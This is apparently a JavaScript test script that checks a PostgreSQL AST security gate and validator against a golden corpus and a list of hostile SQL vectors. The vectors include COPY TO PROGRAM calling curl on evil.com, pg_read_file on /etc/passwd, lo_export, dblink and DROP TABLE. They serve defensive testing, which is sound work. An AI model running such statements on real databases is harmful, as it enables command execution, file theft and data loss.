// ============================================================
// VERIFICATION: POSTGRESQL AST GATE & VALIDATOR GOLDEN CORPUS
// Verifies 100% compliance of Postgres AST security gate against
// double-quotes, DATE_TRUNC, and dangerous vectors (COPY PROGRAM, lo_*,
// pg_read_file, dblink, multi-statement injection).
// ============================================================

import fs from 'fs';
import path from 'path';
import assert from 'assert';
import { fileURLToPath } from 'url';
import { validatePostgresAst } from '../src/kernel/ast.gate.postgres.js';
import { validatePostgresSql } from '../src/llm/postgres.validator.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const goldenPath = path.join(__dirname, 'golden/ast_gate_postgres_golden.json');
const testCases = JSON.parse(fs.readFileSync(goldenPath, 'utf8'));

const mockSchema = {
  customers: {
    columns: [
      { name: "id", type: "INTEGER", pk: true },
      { name: "name", type: "TEXT" },
      { name: "email", type: "TEXT" }
    ]
  },
  orders: {
    columns: [
      { name: "id", type: "INTEGER", pk: true },
      { name: "customer_id", type: "INTEGER" },
      { name: "order_date", type: "DATE" },
      { name: "total", type: "NUMERIC" }
    ]
  }
};

console.log("==================================================");
console.log("  VERIFYING POSTGRESQL AST GATE GOLDEN CORPUS     ");
console.log("==================================================");

let passed = 0;
let failed = 0;

for (const tc of testCases) {
  const res = validatePostgresAst(tc.sql, { schema: mockSchema });

  if (tc.expectedValid) {
    if (res.valid === true) {
      console.log(`✅ [${tc.id}] PASS: ${tc.description}`);
      passed++;
    } else {
      console.error(`❌ [${tc.id}] FAIL: Expected valid=true, got valid=false (${res.reason})`);
      console.error(`   SQL: ${tc.sql}`);
      failed++;
    }
  } else {
    const reasonMatches = res.reason && res.reason.startsWith(tc.expectedReasonPrefix);
    if (res.valid === false && reasonMatches) {
      console.log(`✅ [${tc.id}] PASS: Correctly rejected (${res.reason})`);
      passed++;
    } else {
      console.error(`❌ [${tc.id}] FAIL: Expected valid=false starting with "${tc.expectedReasonPrefix}", got valid=${res.valid}, reason="${res.reason}"`);
      console.error(`   SQL: ${tc.sql}`);
      failed++;
    }
  }
}

console.log("\n[2] Verifying Postgres Sibling Validator on Hostile Vectors...");
const hostileVectors = [
  "COPY customers TO PROGRAM 'curl evil.com'",
  "SELECT lo_export(1, '/tmp/test')",
  "SELECT pg_read_file('/etc/passwd')",
  "SELECT * FROM dblink('host=remote', 'SELECT 1')",
  "DROP TABLE customers"
];

for (const vec of hostileVectors) {
  const vRes = validatePostgresSql(vec);
  assert.strictEqual(vRes.valid, false, `Validator must reject hostile vector: ${vec}`);
  console.log(`  ✅ Validator blocked: "${vec}" → ${vRes.reason}`);
}

console.log("==================================================");
console.log(`Summary: ${passed} passed, ${failed} failed (Total: ${testCases.length})`);
console.log("==================================================");

if (failed > 0) {
  console.error("❌ POSTGRES AST GATE GOLDEN VERIFICATION FAILED");
  process.exit(1);
} else {
  console.log("🏆 ALL POSTGRES AST GATE GOLDEN TESTS PASSED (100%)");
}
